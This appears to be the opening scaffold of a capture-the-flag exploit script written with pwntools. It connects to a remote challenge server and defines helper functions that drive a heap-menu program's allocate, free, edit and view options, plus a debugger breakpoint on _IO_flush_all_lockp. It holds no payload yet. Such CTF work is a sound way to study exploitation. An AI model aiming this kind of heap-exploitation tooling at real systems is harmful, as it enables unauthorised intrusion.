from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

#context.terminal = ['tmux', 'splitw', '-h']
#p=process("./www")
p = remote("207.154.239.148", 1344) 
#p=gdb.debug("./www", gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def checktarget():
    global p
    r1 = p.sendlineafter(b">", b"5")
    r3 = p.recvuntil(b"You are using")
    return r1+r3
